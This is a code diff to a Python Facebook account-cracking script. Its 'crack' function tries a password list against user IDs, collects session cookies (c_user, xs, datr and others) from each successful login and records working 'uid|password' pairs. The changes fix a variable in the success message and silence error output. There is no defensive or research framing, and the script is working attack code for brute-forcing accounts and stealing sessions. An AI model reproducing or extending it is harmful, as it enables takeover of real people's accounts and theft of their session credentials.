@@ -218,7 +218,7 @@ def crack(uid, password_list, total_count):
             # Check response
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
-                print('\033[1;92m OK '+user+'')
+                print('\033[1;92m OK '+uid+'')
                 kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
@@ -240,23 +240,23 @@ def crack(uid, password_list, total_count):
                 cps.append(uid+"|"+pw)
                 continue
             else:
-                print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
+                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
         loop += 1
     except requests.exceptions.Timeout:
-        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
     except requests.exceptions.ConnectionError:
         time.sleep(5)
         return False
     except requests.exceptions.RequestException as e:
-        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
-        print(f"\r\033[1;93m [Interrupted] User stopped the process")
+        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
